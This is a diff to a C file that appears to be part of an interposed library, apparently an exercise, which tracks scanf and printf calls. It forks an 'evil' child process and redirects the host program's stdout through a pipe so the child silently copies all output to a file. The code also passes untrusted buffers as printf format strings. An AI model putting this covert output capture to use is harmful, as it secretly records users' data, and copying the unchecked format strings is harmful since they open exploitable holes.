@@ -12,23 +12,31 @@
  * library.
  */
 
-static int call_counter = 0;
-static FILE * pipe_write = NULL;
+static int call_counter = 0;  //global for tracking number of calls
+			      //made to scanf and printf
 
+/*
+Loop for reading from pipe and redirecting that output to stdout and file
+ */
 void evil_process_loop(int pipe_fd){
   FILE * evil;
+  //check for env variable specifying filename to write output
   const char* env_evil = getenv("EVILFILENAME");
   if(env_evil == NULL){
     evil = fopen("evil.txt", "w");
   }else{
     evil = fopen(env_evil, "w");
   }
+  if(evil == NULL){
+    perror("Unable to open output file");
+    exit(1);
+  }
   char readbuffer[1024];
   int nbytes = read(pipe_fd, readbuffer, sizeof(readbuffer)-1);
   while(nbytes != 0){
     readbuffer[nbytes] = '\0';
-    printf(readbuffer);
-    if(!fprintf(evil, readbuffer)){
+    printf(readbuffer); //write to stdout
+    if(!fprintf(evil, readbuffer)){ //write to file
       perror("write to evil failed");
     }
     nbytes = read(pipe_fd, readbuffer, sizeof(readbuffer)-1);
@@ -38,9 +46,13 @@ void evil_process_loop(int pipe_fd){
   exit(1);
 }
 
+//Creates evil child process and opens pipe for communication between
+//them
+//Redirects stdout from parent process to the pipe
 void fork_evil_process(){
   perror("forking");
   int pipefd[2];
+  //open pipe for child/parent communication
   if(pipe(pipefd) == -1){
     perror("pipe failure");
     return;
@@ -49,10 +61,12 @@ void fork_evil_process(){
   if(process_id == -1){
     perror("fork error");
     return;
+    //child process, enter pipe read loop
   }else if(process_id == 0){
     close(pipefd[1]);
     evil_process_loop(pipefd[0]);
     return;
+    //parent, redirect stdout to pipe
   }else{
     close(pipefd[0]);
     dup2(pipefd[1], STDOUT_FILENO);
